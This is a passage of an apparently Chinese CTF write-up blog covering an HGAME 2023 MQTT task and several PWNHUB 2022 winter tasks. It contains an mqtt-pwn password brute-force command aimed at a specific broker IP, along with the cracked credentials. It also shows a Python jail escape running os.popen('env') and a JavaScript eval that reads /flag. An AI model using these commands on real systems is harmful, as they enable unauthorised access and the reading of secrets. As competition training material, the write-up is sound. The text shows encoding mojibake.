twice</h3><blockquote><p>å…”å…”åœ¨è½¦ç«™é—¨å£çœ‹åˆ°ä¸€å¼ å¡‘æ–™å‡³å­,ä¸Šè¾¹åç€ä¸€ä¸ªè‡ªç§°Vçš„ç”·äºº.ä»–å¸Œæœ›ä½ èƒ½å¸®ä»–ç™»ä¸Šä»–çš„å¤§å· Vergil å»é‚£è¾¹çš„å…¬å‘Šæ ä¸Šåº·åº·Neroæ‰‹ä¸Šçš„YAMATOæ€ä¹ˆæ ·äº†</p><p>broker:117.50.177.240:1883</p><p>HINTS:</p><p>Hint: mqtt</p></blockquote><p>æ ¹æ®brokeråœ°å€çŸ¥ä½¿ç”¨çš„MQTTåè®®ï¼Œå‚è€ƒ <a href="https://zhuanlan.zhihu.com/p/581871896">ç‰©è”ç½‘å®‰å…¨å®æˆ˜ä»é›¶å¼€å§‹-MQTTåè®®åˆ†æ</a> å®‰è£…mqtt-pwnã€‚</p><p>ä½¿ç”¨å‘½ä»¤çˆ†ç ´ Vergil çš„å¯†ç ï¼ŒæŒ‡å®šç»™å®šçš„å¯†ç æœ¬ï¼š</p><p><code>bruteforce --host 117.50.177.240 --port 1883 -u Vergil -pf password.txt</code></p><p>å¾—åˆ°ç»“æœï¼š</p><p><code>[+] Found valid credentials: Vergil:power</code></p><p>ä¸‹è½½brokerè¿æ¥å·¥å…·MQTT.fxï¼Œä½¿ç”¨è´¦å¯† <code>Vergil/power</code> ç™»å½•brokerï¼Œåœ¨è®¢é˜…å¤„è¾“å…¥ä¸»é¢˜ <code>Nero/YAMATO</code>ï¼Œæ”¶åˆ°åŒ…å«flagçš„ä¿¡æ¯ï¼š<code>hgame&#123;mqtt_1s_p0w3r&#125;</code>ã€‚</p><p>â€‹    </p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;â€‹    &lt;/p&gt;
&lt;p&gt;HGAME 2023 å°†äº 1 æœˆ 5 æ—¥ 20:00 æ­£å¼å¼€å§‹ï¼Œç¥å¤§å®¶ç©å¾—å¼€å¿ƒ :-)&lt;br&gt;çº¿ä¸Šèµ›å¹³å°ï¼š&lt;a href=&quot;https://hgame.vidar.club/&quot;&gt;https://hgame.vidar.club&lt;/a&gt;&lt;br&gt;è¯·å°½</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2023èµ›" scheme="https://lazzzaro.github.io/tags/2023%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>PWNHUB2022å†¬å­£èµ›</title>
    <link href="https://lazzzaro.github.io/2022/12/18/match-PWNHUB2022%E5%86%AC%E5%AD%A3%E8%B5%9B/"/>
    <id>https://lazzzaro.github.io/2022/12/18/match-PWNHUB2022%E5%86%AC%E5%AD%A3%E8%B5%9B/</id>
    <published>2022-12-18T15:20:03.000Z</published>
    <updated>2022-12-20T10:40:05.641Z</updated>
    
    <content type="html"><![CDATA[<p>â€‹    </p><p>âœŒï¸ç«èµ›æ—¶é—´ï¼š12æœˆ17æ—¥ 10:00â€”12æœˆ18æ—¥ 22:00<br>âœŒï¸å¾—åˆ†è§„åˆ™ï¼šæ¯”èµ›é‡‡ç”¨åŠ¨æ€åˆ†æ•°åˆ¶åº¦ ï¼Œæ¯é“é¢˜ç›®çš„åˆ†å€¼å°†æ ¹æ®è§£å‡ºé˜Ÿä¼çš„æ•°é‡è¿›è¡ŒåŠ¨æ€è®°åˆ†ã€‚<br>âœŒï¸é¢˜ç›®ç±»å‹ï¼šWebã€Pwnã€Reverseã€Miscã€Cryptoç­‰</p><p><strong>Rank: 9</strong></p><hr><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="åäº•è§‚å¤©"><a href="#åäº•è§‚å¤©" class="headerlink" title="åäº•è§‚å¤©"></a>åäº•è§‚å¤©</h3><p>pythoné€ƒé€¸ï¼Œåˆ©ç”¨ <code>eval(input())</code> ç»•è¿‡å…³é”®å­—é»‘åå•ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="built_in">input</span>())</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).popen(<span class="string">&quot;env&quot;</span>).read()</span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="è¯ä¹¦é‡Œä¹Ÿæœ‰ç§˜å¯†"><a href="#è¯ä¹¦é‡Œä¹Ÿæœ‰ç§˜å¯†" class="headerlink" title="è¯ä¹¦é‡Œä¹Ÿæœ‰ç§˜å¯†"></a>è¯ä¹¦é‡Œä¹Ÿæœ‰ç§˜å¯†</h3><p>xrayè¯ä¹¦ä¿¡æ¯è§£æï¼Œå‚è€ƒGithubé¡¹ç›® <a href="https://github.com/net5/xray-crack">xray-crack</a>ï¼Œå°† <code>main.go</code> ç¼–è¯‘ï¼š</p><p><code>go build -o goxray main.go</code></p><p>å†è¿è¡Œï¼š</p><p><code>./goxray -p xray-license.lic</code></p><p>å³å¯å¾—åˆ°è¯ä¹¦å†…å®¹æ•°æ®ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">version ok: 2</span><br><span class="line">license parsed: &#123;bc5d237dc9b7470e94b61687c19e62fc 3270cdada4eb4a809d25ff4820d5a1f7 ç‹å¾·å‘ COMMUNITY-ADVANCED 1320981071 1645539742&#125;</span><br><span class="line">crypto/rsa: verification error</span><br></pre></td></tr></table></figure><p>æ•…flagä¸ºuser_idï¼š<code>flag&#123;3270cdada4eb4a809d25ff4820d5a1f7&#125;</code>ã€‚</p><p>â€‹    </p><h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h3 id="å¤§æ‚çƒ©"><a href="#å¤§æ‚çƒ©" class="headerlink" title="å¤§æ‚çƒ©"></a>å¤§æ‚çƒ©</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">padding = <span class="keyword">lambda</span> num, bit_len: (num &lt;&lt; (<span class="number">512</span> - bit_len)) + getrandbits(<span class="number">512</span> - bit_len)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;**************************************&#x27;</span></span><br><span class="line">m1, m2 = bytes_to_long(flag[:<span class="number">19</span>]), bytes_to_long(flag[<span class="number">19</span>:])</span><br><span class="line">p = next_prime(padding(m1, m1.bit_length()))</span><br><span class="line">q = next_prime(padding(m2, m2.bit_length()))</span><br><span class="line">n = p * q</span><br><span class="line">e = getPrime(<span class="number">128</span>)</span><br><span class="line">d = inverse(e, (p - <span class="number">1</span>) * (q-<span class="number">1</span>))</span><br><span class="line">a, b = e &amp; <span class="number">0x3ffffffffff</span>, e &gt;&gt; <span class="number">42</span></span><br><span class="line">N = getPrime(<span class="number">128</span>)</span><br><span class="line">E = EllipticCurve(Zmod(N), [a, b])</span><br><span class="line">NN = getPrime(<span class="number">1024</span>)</span><br><span class="line">S = inverse(getPrime(<span class="number">128</span>), NN) * inverse(getPrime(<span class="number">128</span>), NN)</span><br><span class="line">d1 = d &gt;&gt; <span class="number">512</span></span><br><span class="line">d2 = d &amp; (<span class="number">1</span> &lt;&lt; <span class="number">512</span>) - <span class="number">1</span></span><br><span class="line">enc1 = S * d1 % NN</span><br><span class="line">enc2 = S * d2 % NN</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n =&#x27;</span>, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;a =&#x27;</span>, a)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;N =&#x27;</span>, N)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;POINT =&#x27;</span>, E.lift_x(<span class="number">996</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;enc1 =&#x27;</span>, enc1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;enc2 =&#x27;</span>, enc2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;NN =&#x27;</span>, NN)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># n = 117749279680045360245987277946945707343578937283621512842997606104123872211782263906911929773756533011817679794905642225389185861207256322349591633257348367854563703050789889773031032949742664695416275919382068347995088593380486820784360816053546651916291080971628354468517506190756456913824397593128781030749</span></span><br><span class="line"><span class="comment"># a = 1755716071599</span></span><br><span class="line"><span class="comment"># N = 236038564943567983056828121309828109017</span></span><br><span class="line"><span class="comment"># POINT = (996 : 151729833458737979764886336489671975339 : 1)</span></span><br><span class="line"><span class="comment"># enc1 = 98662590652068949920571979585725979127266112216583776160769090971169664292493813021843624362593669574513220457664819153878956311077379392531742253343961645534972639309537402874636739745717765969720117162780620981639015788423324884640935466801234207019510919768602974162878323777374364290185048275714332671356</span></span><br><span class="line"><span class="comment"># enc2 = 58738699705013897273174837829098879580829898980458718341881900446701910685043213698485036350888862454440118347362218485065377354137391792039111639199258042591959084091242821874819864955504791788260187064338245516327147327866373690756260239728218244294166383516151782123688633986853602732137707507845681977204</span></span><br><span class="line"><span class="comment"># NN = 149794788177729409820185150543033616327574456754306207341321223589733698623477041345453230785413920341465642754285280273761269552897080096162195035057667200692677841848045965505750839903359478511509753781737513122660495056746669041957643882516287304836822410136985711091802722010788615177574143908444311475347</span></span><br></pre></td></tr></table></figure></blockquote><p>$a,b$ åˆ†åˆ«ä¸º $e$ çš„ä½42ä½å’Œé«˜(128-42)ä½ï¼Œæœ‰ $e=2^{42}b+a$ã€‚</p><p>$a$ å·²çŸ¥ï¼Œæ ¹æ®ç‚¹ $P=(P_x,P_y)$ åŠæ¤­åœ†æ›²çº¿ $E$ æ–¹ç¨‹ $y^2 \equiv x^3+ax+b \pmod N$ï¼Œä»£å…¥æ±‚è§£ $b$ã€‚</p><p>åŒç†ï¼Œ$d=2^{512}d_1+d_2$ï¼Œå›  $c_1 = Sd_1 \bmod Nâ€™,c_2 = Sd_2 \bmod Nâ€™$ï¼Œåˆ†åˆ«ä½¿ç”¨ç±»ä¼¼Wiener Attackçš„æ ¼å­æ±‚è§£ $d_1,d_2$ã€‚</p><p>æœ€åå·²çŸ¥ $e,d,n$ï¼Œåˆ†è§£ $n$ å¾— $p,q$ï¼Œflagä¸¤éƒ¨åˆ†åˆ†åˆ«åœ¨ $p,q$ ä¸­ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">divide_pq</span>(<span class="params">e, d, n</span>):</span><br><span class="line">    k = e*d - <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        g = random.randint(<span class="number">2</span>, n-<span class="number">1</span>)</span><br><span class="line">        t = k</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">if</span> t % <span class="number">2</span> != <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            t //= <span class="number">2</span></span><br><span class="line">            x = <span class="built_in">pow</span>(g, t, n)</span><br><span class="line">            <span class="keyword">if</span> x &gt; <span class="number">1</span> <span class="keyword">and</span> gmpy2.gcd(x-<span class="number">1</span>, n) &gt; <span class="number">1</span>:</span><br><span class="line">                p = gmpy2.gcd(x-<span class="number">1</span>, n)</span><br><span class="line">                <span class="keyword">return</span> (p, n//p)</span><br><span class="line"></span><br><span class="line">n = <span class="number">117749279680045360245987277946945707343578937283621512842997606104123872211782263906911929773756533011817679794905642225389185861207256322349591633257348367854563703050789889773031032949742664695416275919382068347995088593380486820784360816053546651916291080971628354468517506190756456913824397593128781030749</span></span><br><span class="line">a = <span class="number">1755716071599</span></span><br><span class="line">N = <span class="number">236038564943567983056828121309828109017</span></span><br><span class="line">Px, Py = (<span class="number">996</span>, <span class="number">151729833458737979764886336489671975339</span>)</span><br><span class="line">enc1 = <span class="number">98662590652068949920571979585725979127266112216583776160769090971169664292493813021843624362593669574513220457664819153878956311077379392531742253343961645534972639309537402874636739745717765969720117162780620981639015788423324884640935466801234207019510919768602974162878323777374364290185048275714332671356</span></span><br><span class="line">enc2 = <span class="number">58738699705013897273174837829098879580829898980458718341881900446701910685043213698485036350888862454440118347362218485065377354137391792039111639199258042591959084091242821874819864955504791788260187064338245516327147327866373690756260239728218244294166383516151782123688633986853602732137707507845681977204</span></span><br><span class="line">NN = <span class="number">149794788177729409820185150543033616327574456754306207341321223589733698623477041345453230785413920341465642754285280273761269552897080096162195035057667200692677841848045965505750839903359478511509753781737513122660495056746669041957643882516287304836822410136985711091802722010788615177574143908444311475347</span></span><br><span class="line"></span><br><span class="line">F = Zmod(N)</span><br><span class="line">b = <span class="built_in">int</span>(F(Py^<span class="number">2</span> - (Px^<span class="number">3</span> + a*Px)))</span><br><span class="line">e = <span class="number">2</span>^<span class="number">42</span> * b + a</span><br><span class="line"></span><br><span class="line">L1 = Matrix(ZZ, [[enc1, <span class="number">2</span>^<span class="number">256</span>],[NN, <span class="number">0</span>]])</span><br><span class="line">d1 = -L1.LLL()[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">L2 = Matrix(ZZ, [[enc2, <span class="number">2</span>^<span class="number">256</span>],[NN, <span class="number">0</span>]])</span><br><span class="line">d2 = -L2.LLL()[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">d = <span class="number">2</span>^<span class="number">512</span> * d1 + d2</span><br><span class="line"></span><br><span class="line">p, q = divide_pq(e, d, n)</span><br><span class="line">flag1 = <span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(p&gt;&gt;(<span class="number">512</span>-<span class="number">19</span>*<span class="number">8</span>+<span class="number">2</span>))[<span class="number">2</span>:])</span><br><span class="line">flag2 = <span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(q&gt;&gt;(<span class="number">512</span>-<span class="number">19</span>*<span class="number">8</span>+<span class="number">1</span>))[<span class="number">2</span>:])</span><br><span class="line"><span class="built_in">print</span>(flag1)</span><br><span class="line"><span class="built_in">print</span>(flag2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;4cb201080d8b240774&#125;&#x27;</span></span><br><span class="line"><span class="comment"># b&#x27;flag&#123;e89f47939d1243&#x27;</span></span><br></pre></td></tr></table></figure><p>flagï¼š<code>flag&#123;e89f47939d12434cb201080d8b240774&#125;</code>ã€‚</p><p>â€‹    </p><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="justJS"><a href="#justJS" class="headerlink" title="justJS"></a>justJS</h3><p>jså‘½ä»¤æ‰§è¡Œå³å¯ï¼š</p><p><code>eval(read(&quot;/flag&quot;))</code></p><p>åœ¨ <code>eval()</code> çš„æŠ¥é”™æ–‡å­—ä¸­å¾—åˆ°flagï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">undefined:1: SyntanError: Unexpected token &#x27;&#123;&#x27;</span><br><span class="line">flag&#123;5cff08f23eb37451bd84effb99275794&#125;</span><br><span class="line">    ^</span><br><span class="line">SyntanError: Unexpected token &#x27;&#123;&#x27;</span><br><span class="line">    at input.js:1:6</span><br></pre></td></tr></table></figure><p>â€‹    </p><h2 id="ppc"><a href="#ppc" class="headerlink" title="ppc"></a>ppc</h2><h3 id="Tcp-Show"><a href="#Tcp-Show" class="headerlink" title="Tcp Show"></a>Tcp Show</h3><blockquote><p><strong>Description</strong></p><p>ä¼—æ‰€å‘¨çŸ¥ï¼ŒWireshark å¸¦æœ‰ä¸€ä¸ª follow tcp stream åŠŸèƒ½ï¼Œå¯ä»¥å±•ç¤º TCP æµé‡çš„æ¥å›é€šä¿¡ã€‚</p><p>ä¸ºäº†ç»™æŸäº§å“å¢åŠ æ˜¾ç¤º TCP æ¥å›æµé‡çš„åŠŸèƒ½ï¼Œä½ å‡†å¤‡è¯»å–æµé‡æ–‡ä»¶æ¥ç”Ÿæˆç±»ä¼¼çš„å±•ç¤ºæ•ˆæœã€‚</p><p><strong>Input</strong></p><p>ç¬¬ä¸€è¡Œè¾“å…¥ä¸€ä¸ªæ•°å­— Nï¼Œè¡¨ç¤ºæ¥ä¸‹æ¥æœ‰ N è¡Œã€‚</p><p>æ¥ä¸‹æ¥ N è¡Œï¼Œæ¯ä¸€è¡Œéƒ½ç”±ä¸¤éƒ¨åˆ†ç»„æˆã€‚é¦–å…ˆæ˜¯ä¸€ä¸ªæ•°å­— Dï¼Œæ•°å­— D ä¸º 0 è¡¨ç¤ºä¸ºå®¢æˆ·ç«¯å‘ç»™æœåŠ¡å™¨çš„æ–¹å‘ï¼Œæ•°å­— D ä¸º 1 è¡¨ç¤ºæœåŠ¡å™¨å‘ç»™å®¢æˆ·ç«¯æ–¹å‘ï¼›ç„¶åç¬¬äºŒéƒ¨åˆ†æ˜¯ä¸€ä¸ª base64 å­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºç¼–ç åçš„æµé‡å…·ä½“å†…å®¹ã€‚</p><p><strong>Output</strong></p><p>å¯¹äºæ¯ä¸€è¡Œçš„æµé‡åŒ…ï¼Œç”Ÿæˆç±»ä¼¼ wireshark çš„ hexdump æ¨¡å¼çš„æµé‡å±•ç¤ºã€‚å…¶ä¸­ï¼š</p><ol><li><p>æ¯è¡Œå¼€å¤´éƒ½æ˜¯ 8 ä½ hexï¼Œè¡¨ç¤ºå½“å‰è¿™ä¸€è¡Œåœ¨è¯¥æµé‡åŒ…çš„åç§»ã€‚</p></li><li><p>ä¸¤ä¸ªç©ºæ ¼ä¹‹åï¼Œæ˜¯è¯¥æµé‡åŒ…çš„ hex dump å†…å®¹ï¼Œæ¯è¡Œ 16 ä¸ª hex dumpã€‚</p></li><li><p>hex dump ä¹‹åï¼Œæ˜¯è¯¥æµé‡åŒ…å†…å®¹çš„å­—ç¬¦æ˜¾ç¤ºï¼Œå¯¹äºå¯è§å­—ç¬¦(32 ~ 126)ï¼Œæ˜¾ç¤ºå­—ç¬¦æœ¬èº«ï¼Œå¯¹äºä¸å¯è§å­—ç¬¦ï¼Œæ˜¾ç¤ºä¸€ä¸ª . å·</p></li><li><p>å¯¹äºæ— æ³•å‡‘é½ 16 ä¸ª hex çš„è¡Œï¼Œå…¶ä¸è¶³çš„å†…å®¹ç”¨ç©ºæ ¼ä»£æ›¿ã€‚ç¡®ä¿æ¯ä¸€è¡Œçš„æ€»é•¿åº¦æ˜¯ç›¸ç­‰çš„ã€‚</p></li><li><p>æ ¹æ®ä¸‹é¢çš„æ ·ä¾‹ï¼Œä»”ç»†å¤„ç†ç©ºæ ¼çš„æ•°é‡ã€‚</p></li></ol></blockquote><p>æŒ‰ç…§è¾“å‡ºè¦æ±‚æ ¼å¼åŒ–è§£æå³å¯ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> ceil</span><br><span class="line"></span><br><span class="line">N = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(N):</span><br><span class="line">    k, b = <span class="built_in">input</span>().split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    h = <span class="built_in">list</span>(b64decode(b.encode()))</span><br><span class="line">    <span class="keyword">if</span> k == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(ceil(<span class="built_in">len</span>(h)/<span class="number">16</span>)):</span><br><span class="line">            ind = <span class="built_in">hex</span>(i*<span class="number">16</span>)[<span class="number">2</span>:].rjust(<span class="number">8</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">            hh = h[<span class="number">16</span>*i:<span class="number">16</span>*(i+<span class="number">1</span>)]</span><br><span class="line">            hh1 = <span class="string">&#x27; &#x27;</span>.join([<span class="built_in">hex</span>(j)[<span class="number">2</span>:].rjust(<span class="number">2</span>,<span class="string">&#x27;0&#x27;</span>) <span class="keyword">for</span> j <span class="keyword">in</span> hh[:<span class="number">8</span>]] + [<span class="string">&#x27;  &#x27;</span>]*(<span class="number">8</span>-<span class="built_in">len</span>(hh[:<span class="number">8</span>])))</span><br><span class="line">            hh2 = <span class="string">&#x27; &#x27;</span>.join([<span class="built_in">hex</span>(j)[<span class="number">2</span>:].rjust(<span class="number">2</span>,<span class="string">&#x27;0&#x27;</span>) <span class="keyword">for</span> j <span class="keyword">in</span> hh[<span class="number">8</span>:]] + [<span class="string">&#x27;  &#x27;</span>]*(<span class="number">8</span>-<span class="built_in">len</span>(hh[<span class="number">8</span>:])))</span><br><span class="line">            ch1 = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(j) <span class="keyword">if</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>) <span class="keyword">else</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">for</span> j <span class="keyword">in</span> hh[:<span class="number">8</span>]]).ljust(<span class="number">8</span>,<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">            ch2 = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(j) <span class="keyword">if</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>) <span class="keyword">else</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">for</span> j <span class="keyword">in</span> hh[<span class="number">8</span>:]]).ljust(<span class="number">8</span>,<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;ind&#125;</span>  <span class="subst">&#123;hh1&#125;</span>  <span class="subst">&#123;hh2&#125;</span>   <span class="subst">&#123;ch1&#125;</span> <span class="subst">&#123;ch2&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(ceil(<span class="built_in">len</span>(h)/<span class="number">16</span>)):</span><br><span class="line">            ind = <span class="built_in">hex</span>(i*<span class="number">16</span>)[<span class="number">2</span>:].rjust(<span class="number">8</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">            hh = h[<span class="number">16</span>*i:<span class="number">16</span>*(i+<span class="number">1</span>)]</span><br><span class="line">            hh1 = <span class="string">&#x27; &#x27;</span>.join([<span class="built_in">hex</span>(j)[<span class="number">2</span>:].rjust(<span class="number">2</span>,<span class="string">&#x27;0&#x27;</span>) <span class="keyword">for</span> j <span class="keyword">in</span> hh[:<span class="number">8</span>]] + [<span class="string">&#x27;  &#x27;</span>]*(<span class="number">8</span>-<span class="built_in">len</span>(hh[:<span class="number">8</span>])))</span><br><span class="line">            hh2 = <span class="string">&#x27; &#x27;</span>.join([<span class="built_in">hex</span>(j)[<span class="number">2</span>:].rjust(<span class="number">2</span>,<span class="string">&#x27;0&#x27;</span>) <span class="keyword">for</span> j <span class="keyword">in</span> hh[<span class="number">8</span>:]] + [<span class="string">&#x27;  &#x27;</span>]*(<span class="number">8</span>-<span class="built_in">len</span>(hh[<span class="number">8</span>:])))</span><br><span class="line">            ch1 = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(j) <span class="keyword">if</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>) <span class="keyword">else</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">for</span> j <span class="keyword">in</span> hh[:<span class="number">8</span>]]).ljust(<span class="number">8</span>,<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">            ch2 = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(j) <span class="keyword">if</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>) <span class="keyword">else</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">for</span> j <span class="keyword">in</span> hh[<span class="number">8</span>:]]).ljust(<span class="number">8</span>,<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;        <span class="subst">&#123;ind&#125;</span>  <span class="subst">&#123;hh1&#125;</span>  <span class="subst">&#123;hh2&#125;</span>   <span class="subst">&#123;ch1&#125;</span> <span class="subst">&#123;ch2&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="Fight-Clones"><a href="#Fight-Clones" class="headerlink" title="Fight Clones"></a>Fight Clones</h3><blockquote><p><strong>Description</strong></p><p>Neo è¢« Smith çš„åˆ†èº«ä»¬åŒ…å›´äº†ï¼ä»–éœ€è¦å‡»è´¥ä»–ä»¬ï¼</p><p>æ¯ä¸€ä¸ª Smith éƒ½æœ‰è‡ªå·±çš„æ”»å‡»å€¼å’Œç”Ÿå‘½å€¼ã€‚åœ¨å—åˆ°æ”»å‡»ä¹‹å‰ï¼Œä»–ä»¬éƒ½å¯ä»¥æŒç»­æ”»å‡» Neoã€‚</p><p>Neo ä¹Ÿæœ‰è‡ªå·±çš„æ”»å‡»å€¼å’Œç”Ÿå‘½å€¼ï¼Œè™½ç„¶æ¯” Smith é«˜å¾—å¤šï¼Œä½†æ˜¯ Neo ä¸€æ¬¡ä¹Ÿåªèƒ½æ”»å‡»ä¸€ä¸ª Smithï¼ˆæ˜¯çš„ä»–æ²¡æœ‰ AOEï¼‰ã€‚</p><p>Neo éœ€è¦æ‰¾åˆ°ä¸€ä¸ªæœ€ä¼˜çš„æ”»å‡»ç­–ç•¥ï¼Œä»¥ä¿è¯è‡ªå·±ç”Ÿå‘½å€¼è¢«å‡ä¸ºé›¶ä¹‹å‰å‡»å€’æ‰€æœ‰ Smithã€‚</p><p>Neo çš„ç”Ÿå‘½å€¼æ˜¯ç¡®å®šçš„ï¼ŒOracle ä¹‹å‰å‘Šè¯‰è¿‡ä»–ã€‚ä½†æ˜¯ä»–éœ€è¦çŸ¥é“è‡ªå·±çš„æ”»å‡»å€¼æ˜¯å¦èƒ½å¤Ÿç¡®ä¿æ‰“èµ¢ Smith ä»¬ã€‚</p><p>ä½ èƒ½å¸® Neo è®¡ç®—å‡ºä»–æ‰€éœ€è¦çš„æœ€å°æ”»å‡»å€¼ä¹ˆï¼Ÿ</p><p><strong>Input</strong></p><p>ç¬¬ä¸€è¡Œè¾“å…¥ä¸¤ä¸ªæ•´æ•° $N H$ ($1 \le N \le 1000,1 \le H \le 1000000$)ï¼Œè¡¨ç¤ºæ€»å…±æœ‰ $N$ ä¸ª Smithï¼Œä»¥åŠ Neo 